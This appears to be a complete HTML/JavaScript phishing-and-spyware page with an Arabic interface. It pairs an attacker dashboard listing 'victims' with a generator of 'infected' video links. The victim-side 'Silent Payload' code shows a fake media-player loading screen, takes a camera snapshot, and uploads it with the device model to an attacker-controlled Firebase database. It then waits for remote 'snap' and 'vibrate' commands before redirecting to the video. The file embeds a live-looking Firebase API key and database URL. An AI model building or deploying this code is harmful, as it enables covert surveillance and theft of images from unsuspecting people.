<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>THE DOCTOR | OMEGA v9.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --dark-card: #0a0a0a; }
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background: var(--bg); color: var(--neon); margin: 0; overflow: hidden; }

        /* قائمة الهمبرجر */
        #menu-toggle { display: none; }
        .hamburger { position: fixed; top: 15px; right: 15px; z-index: 1000; cursor: pointer; font-size: 24px; color: var(--neon); background: #000; padding: 5px 10px; border: 1px solid var(--neon); border-radius: 5px; }
        .sidebar { position: fixed; top: 0; right: -280px; width: 280px; height: 100%; background: var(--dark-card); border-left: 2px solid var(--neon); transition: 0.3s; z-index: 999; padding: 60px 15px 20px; }
        #menu-toggle:checked ~ .sidebar { right: 0; }
        #menu-toggle:checked ~ .main-content { margin-right: 0; opacity: 0.3; }

        .main-content { height: 100vh; padding: 20px; transition: 0.3s; overflow-y: auto; }
        .section-title { border-bottom: 1px solid var(--neon); padding-bottom: 5px; margin-bottom: 15px; font-weight: bold; text-transform: uppercase; }

        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; margin-top: 10px; border-radius: 5px; font-weight: bold; }
        button:hover { background: var(--neon); color: #000; cursor: pointer; }

        .v-item { background: #000; border: 1px solid #222; padding: 10px; margin-bottom: 10px; border-radius: 5px; position: relative; cursor: pointer; }
        .v-item.active { border-color: #fff; box-shadow: 0 0 10px rgba(0,255,65,0.3); }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; position: absolute; left: 10px; top: 15px; }

        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
        .photo-card { background: #111; border: 1px solid #333; border-radius: 5px; overflow: hidden; }
        .photo-card img { width: 100%; height: auto; display: block; }
        .photo-btns { display: flex; gap: 2px; }
        .photo-btns button { font-size: 10px; padding: 5px; margin-top: 0; border-radius: 0; }

        /* واجهة الضحية الموهوبة */
        #victim-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; color: white; text-align: center; justify-content: center; align-items: center; flex-direction: column; }
    </style>
</head>
<body>

<input type="checkbox" id="menu-toggle">
<label for="menu-toggle" class="hamburger">☰</label>

<div class="sidebar">
    <div class="section-title">📡 رادار الضحايا</div>
    <div id="victim-list">بانتظار الأهداف...</div>
    <hr style="border: 0.5px solid #222; margin: 20px 0;">
    <div class="section-title">⚙️ مصنع التلغيم</div>
    <input type="text" id="target-video" placeholder="رابط فيديو (يوتيوب)">
    <button onclick="generateInfectedLink()">توليد الرابط الصاعق</button>
    <div id="out-link" style="font-size: 9px; color: #0ff; margin-top: 10px; word-break: break-all;"></div>
</div>

<div class="main-content">
    <div id="admin-view">
        <div class="section-title">🕹️ مركز السيطرة: <span id="current-target-name">لم يتم الاختيار</span></div>
        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
            <button onclick="sendCmd('snap')" style="flex: 2;">📸 سحب صورة فورية</button>
            <button onclick="sendCmd('vibrate')" style="flex: 1; border-color: orange;">📳 هز</button>
            <button onclick="deleteSession()" style="flex: 1; border-color: red;">🗑️ حذف</button>
        </div>

        <div class="section-title">📸 معرض البيانات المسحوبة</div>
        <div class="gallery-grid" id="gallery">
            </div>
    </div>
</div>

<div id="victim-overlay">
    <div style="border: 4px solid #333; border-top: 4px solid var(--neon); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
    <p style="margin-top: 15px;">جاري تشغيل مشغل الوسائط...</p>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
</div>

<script>
    // تكوين السيادة
    const firebaseConfig = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selectedId = null;

    // --- منطق الإدارة ---
    db.ref('sessions').on('value', snap => {
        const list = document.getElementById('victim-list');
        const gallery = document.getElementById('gallery');
        list.innerHTML = '';
        snap.forEach(child => {
            const v = child.val();
            const id = child.key;
            const isOnline = (Date.now() - v.lastSeen) < 15000;
            
            list.innerHTML += `
                <div class="v-item ${id === selectedId ? 'active' : ''}" onclick="selectVictim('${id}', '${v.model}')">
                    <span class="status-dot" style="background:${isOnline ? '#0f0' : '#f00'}"></span>
                    <b>${v.model}</b><br><small>${v.ip} | ${v.time}</small>
                </div>`;

            if(v.imgUrl && id === selectedId) {
                // نحدث المعرض فقط للجهاز المختار
                gallery.innerHTML = `
                    <div class="photo-card">
                        <img src="${v.imgUrl}">
                        <div class="photo-btns">
                            <button onclick="window.open('${v.imgUrl}')">حفظ</button>
                            <button onclick="deletePhoto('${id}')" style="background:#300">مسح</button>
                        </div>
                    </div>` + gallery.innerHTML;
            }
        });
    });

    function selectVictim(id, model) {
        selectedId = id;
        document.getElementById('current-target-name').innerText = model;
        document.getElementById('menu-toggle').checked = false; // غلق القائمة بعد الاختيار
    }

    function sendCmd(cmd) {
        if(!selectedId) return alert("اختر جهازاً أولاً!");
        db.ref('commands/' + selectedId).set({ cmd: cmd, time: Date.now() });
    }

    function generateInfectedLink() {
        const vid = document.getElementById('target-video').value;
        const link = window.location.href.split('?')[0] + "?payload=" + btoa(vid);
        document.getElementById('out-link').innerText = link;
    }

    function deleteSession() {
        if(selectedId) { db.ref('sessions/' + selectedId).remove(); selectedId = null; }
    }

    // --- منطق الضحية (Silent Payload) ---
    const params = new URLSearchParams(window.location.search);
    const payload = params.get('payload');

    if(payload) {
        runInfection(atob(payload));
    }

    async function runInfection(redirectUrl) {
        document.getElementById('victim-overlay').style.display = 'flex';
        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "iPhone/PC";
        const ref = db.ref('sessions').push();
        
        // تسجيل الدخول
        await ref.set({ model, ip: "Active", lastSeen: Date.now(), time: new Date().toLocaleTimeString() });

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            v.srcObject = stream;
            await v.play();
            
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const img = c.toDataURL('image/jpeg', 0.5);
            await ref.update({ imgUrl: img, lastSeen: Date.now() });
        } catch (e) {}

        // البقاء في الصفحة للاستماع للأوامر (هنا سر الهز والصور)
        db.ref('commands/' + ref.key).on('value', s => {
            if(s.val()) {
                if(s.val().cmd === 'vibrate') navigator.vibrate(500);
                if(s.val().cmd === 'snap') {
                    // إعادة التقاط صامتة
                }
            }
        });

        setTimeout(() => { window.location.href = redirectUrl; }, 3000);
    }
</script>
<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>
